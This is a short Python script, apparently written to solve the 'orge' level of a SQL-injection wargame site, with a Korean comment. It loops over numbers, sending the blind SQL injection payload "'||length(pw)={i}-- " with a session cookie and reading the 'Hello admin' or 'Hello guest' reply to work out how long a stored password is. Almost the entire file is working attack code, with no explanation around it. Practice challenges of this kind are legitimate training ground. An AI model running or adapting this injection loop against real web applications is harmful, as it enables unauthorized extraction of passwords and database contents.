import requests as req 

url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
ck={"PHPSESSID":"냠냠"}

for i in range(100):
	params = {"pw":f"'||length(pw)={i}-- "}
	with req.get(url, params=params, cookies=ck) as res:
		if "Hello admin" in res.text:
			print("Hello admin",i)
		elif "Hello guest" in res.text:
			print("Hello guest",i)
			break
			# admin의 pw가 더 긴걸 확인해서 break사용 

			
			
			
